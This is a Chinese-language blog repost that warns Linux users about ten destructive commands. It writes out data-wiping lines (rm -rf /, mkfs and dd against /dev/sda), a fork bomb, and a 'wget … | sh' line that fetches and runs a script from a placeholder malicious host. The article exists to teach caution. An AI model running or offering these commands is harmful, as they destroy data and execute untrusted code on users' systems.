# Linux的10个最危险的命令 - 算法与数学之美 - CSDN博客
2018年12月12日 21:48:40[算法与数学之美](https://me.csdn.net/FnqTyr45)阅读数：147
Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么时候。
这篇文章将会向你介绍十条命令，但你最好不要尝试着去使用。
当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普通用户身份下，破坏的只是自己的一亩三分地。
** 1. rm -rf 命令 **
rm -rf命令是删除文件夹及其内容最快的方式之一。
仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。
下列是一些rm 命令的选项：
- 
rm　命令在Linux下通常用来删除文件。
- 
rm -r 命令递归的删除文件夹，甚至是空的文件夹。
- 
rm -f 命令能不经过询问直接删除‘只读文件’。Linux下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f这个参数只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的rm命令其实也是没有删除提示的，只是一般的发行版都会将rm通过别名的方式增加-i参数来要求删除确认，而-f则抑制了这个提示。
- 
rm -rf / : 强制删除根目录下所有东东。
- 
rm -rf *:　强制删除当前目录的所有文件。
- 
rm -rf . : 强制删除当前文件夹及其子文件夹。
从现在起，当你要执行rm -rf命令时请留心一点。我们可以在“.bashrc”文件对‘rm‘命令创建rm -i的别名，来预防用 ‘rm‘命令删除文件时的事故，它会要求你确认每一个删除请求。（译注：大多数发行版已经这样做了，如果还没有，请这样做，并在使用-f参数前一定考虑好你在做什么！译者本人有着血泪的教训啊。）
** 2. :(){:|:&};: 命令 **
这就是个fork 炸弹的实例。
具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。
![640?wx_fmt=png](https://ss.csdn.net/p?https://mmbiz.qpic.cn/mmbiz_png/951TjTgiabkzmExrGk70Lqcdll6HqnIibhXznK8teYiaZjJ6gNPfsFHVyWEASqp4LetOAuMu7DV7S6D7hUqj7s1jQ/640?wx_fmt=png)
** 3. 命令　> /dev/sda **
这个命令会将某个‘命令‘的输出写到块设备/dev/sda中。
该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。
** 4. mv 文件夹 /dev/null **
这个命令会移动某个‘文件夹‘到/dev/null。
在Linux中 /dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。
当然，要说明的是这个命令并不能阻止数据恢复软件——所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成。
![640?wx_fmt=png](https://ss.csdn.net/p?https://mmbiz.qpic.cn/mmbiz_png/951TjTgiabkzmExrGk70Lqcdll6HqnIibh4MNCicXTQiab9FYmY611QsSqzYFZQypicvAvYybMQtxFPg7HBsvZglBow/640?wx_fmt=png)
** 5. wget http://malicious_source -O- | sh **
该命令会从一个（也许是）恶意源下载一个脚本并执行。
Ｗget命令会下载这个脚本，而sh会（无条件的）执行下载下来的脚本。
注意: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。
** 6. mkfs.ext3 /dev/sda **
上列命令会格式化块设备‘sda’，在执行这个命令后你的块设备(硬盘驱动器)会被格式化，直接让你的系统达到不可恢复的阶段。
通常我们不会直接使用/dev/sda这样的设备，除非是作为raw设备使用。
一般都需要将sda分成类似sda1、sda2这样的分区后才使用。当然，无论你使用sda还是sda1，这样对块设备或分区进行mkfs都是毁灭性的，上面的数据都会被蒸发了。
** 7. > file **
这个命令常用来清空文件内容或记录命令输出。
不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。
你可能真正想用的是“>>”，即累加新的输出到文件，而不是刷新那个文件。
如果用上列执行时输入错误或无知的输入类似 “> xt.conf”　的命令会覆盖配置文件或其他任何的系统配置文件。
** 8. ^foo^bar **
这个命令用来编辑先前运行的命令而无需重打整个命令。
用foobar命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。
** 9. dd if=/dev/random of=/dev/sda **
这个命令会向块设备sda写入随机的垃圾文件从而擦出数据，让你的系统可能陷入混乱和不可恢复的状态。
记得上面说过mv到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。
** 10. 隐藏命令 **
下面的命令其实就是上面第一个命令 (rm -rf)。
这里的代码是隐藏在十六进制里的,一个无知的用户可能就会被愚弄，如果在终端里运行下面命令可能会擦除你的根分区。
真正的危险是隐藏起来的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。
切记，千万不要编译／运行从未知来源的代码。
![640?wx_fmt=png](https://ss.csdn.net/p?https://mmbiz.qpic.cn/mmbiz_png/951TjTgiabkzmExrGk70Lqcdll6HqnIibheicCVtMxML6n2WN1AsObOGiaFbRqmsl9IGT5z07dzJInN4M4LPYhBzHw/640?wx_fmt=png)
今天给大家带来的是个命令到这里就结束了啦，请千万记住不要再服务器或者其他设备上随意尝试~
如果你想测试它们，请在虚拟机上运行，不然文件丢失或者系统奔溃就不好了。
**END**
∑编辑 | Gemini
*来源 | 数学建模*
**更多精彩：**
☞  [哈尔莫斯：怎样做数学研究](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652554187&idx=1&sn=35143b89b06fe4f5273f210b2d6a7c91&chksm=8b7e3290bc09bb86f7bb3f158d993df3f019a7e9ce3bc8897e164e35a2ebe5a4e0bdcc111089&scene=21#wechat_redirect)
☞  [扎克伯格2017年哈佛大学毕业演讲](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652554187&idx=2&sn=c75293463823e4d6769638e54b64f3ec&chksm=8b7e3290bc09bb86dc1e3f8e78d0b6de8811d75f3dcb092766fcb8ba0bab1cd9ba1ddfcef3b9&scene=21#wechat_redirect)
☞  [线性代数在组合数学中的应用](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652554141&idx=1&sn=74a74c4e4d08eba0dd734528aa0b08e7&chksm=8b7e32c6bc09bbd073b34c22004ac6e4d99c8a0caa64c7d3dbaa8fd55e6ef1fc87ed545b8b7e&scene=21#wechat_redirect)
☞  [你见过真的菲利普曲线吗？](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652554105&idx=1&sn=224ab0d38fb57facea70081385360d58&chksm=8b7e3222bc09bb34d3b6df665087e64b233778ed427598d08e809f96261e898c1c0de6188bbc&scene=21#wechat_redirect)
☞  [支持向量机(SVM)的故事是这样子的](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652554096&idx=1&sn=46783e6ace661a3ccbd8a6e00fb17bf9&chksm=8b7e322bbc09bb3d73dc240f2280bddf2ef8b7824a459a24bd7f6eeadd60edb96e690d467f6e&scene=21#wechat_redirect)
☞  [深度神经网络中的数学，对你来说会不会太难？](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652554077&idx=2&sn=3ecd63f2205fd59df8c360c97c943ef6&chksm=8b7e3206bc09bb10a36b09547efe0c54f41423b180622c1fdc7f14747ccc8f8fecee3a12e2cd&scene=21#wechat_redirect)
☞  [编程需要知道多少数学知识？](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652554062&idx=1&sn=17f0a88d5e15d1adfc29c690a0b1b89b&chksm=8b7e3215bc09bb038c6caa59d0f49cedd929f9be1104beea3411186cf4c81de69efc71a17883&scene=21#wechat_redirect)
☞  [陈省身——什么是几何学](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652553994&idx=2&sn=74f67a1a3ac5c705f51f2ba619b717f6&chksm=8b7e3251bc09bb47dce73319948780081efe0333ffae99ea04a9eeabbcfcb38a29b4b73fb7c1&scene=21#wechat_redirect)
☞  [模式识别研究的回顾与展望](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652553949&idx=2&sn=d171680964df774397efd9db81c00347&chksm=8b7e3386bc09ba90bf0f6e1cabf82ba86ff94630cb5ee2e0f14ff9455db52be32ddbc289d237&scene=21#wechat_redirect)
☞  [曲面论](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652553747&idx=1&sn=e25f866d510cf2338b6d9e1b32bafb62&chksm=8b7e3348bc09ba5ea1caaf2a7bfcd80a7e7559b1983e473eda2206e56df7f38ef3cecf2f77c7&scene=21#wechat_redirect)
☞  [自然底数e的意义是什么？](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652553811&idx=1&sn=000305074471c3d4c681c9cfd4e4bc93&chksm=8b7e3308bc09ba1e3043f5568a3a75a045285a1de97e4da36918bac68e7c6d579ad5d8cc25ab&scene=21#wechat_redirect)
☞  [如何向5岁小孩解释什么是支持向量机（SVM）？](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652553670&idx=1&sn=ea75a448c016f7229e4cb298f6017614&chksm=8b7e309dbc09b98bc622acdf1223c7c2f743609d0a577dd43c9e9d98ab4da4314be7c1002bd5&scene=21#wechat_redirect)
☞  [华裔天才数学家陶哲轩自述](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652553646&idx=2&sn=bbf8f1be1ca1c66ad3f3270babea6885&chksm=8b7e30f5bc09b9e3e1a4fa735412e2fcb20df9e78f2f346bf578018ceab77de6326095d1bf71&scene=21#wechat_redirect)
☞  [代数，分析，几何与拓扑，现代数学的三大方法论](http://mp.weixin.qq.com/s?__biz=MzA5ODUxOTA5Mg==&mid=2652553596&idx=1&sn=bc5064e871831f862db6d19c3de6327e&chksm=8b7e3027bc09b93194fa09b25e2df400421c062927bb9120912875f8aaf0bb25553fc8f51e3b&scene=21#wechat_redirect)
![640?wx_fmt=jpeg](https://ss.csdn.net/p?https://mmbiz.qpic.cn/mmbiz_jpg/951TjTgiabkz1ZB1ia8vj1KX94wq41TNibp6PJOfErGKnenMhPNQKkWveDFt6OLy3HteTwn3fmJPtfloCxATziaexg/640?wx_fmt=jpeg)
算法数学之美微信公众号欢迎赐稿
稿件涉及数学、物理、算法、计算机、编程等相关领域，经采用我们将奉上稿酬。
投稿邮箱：math_alg@163.com
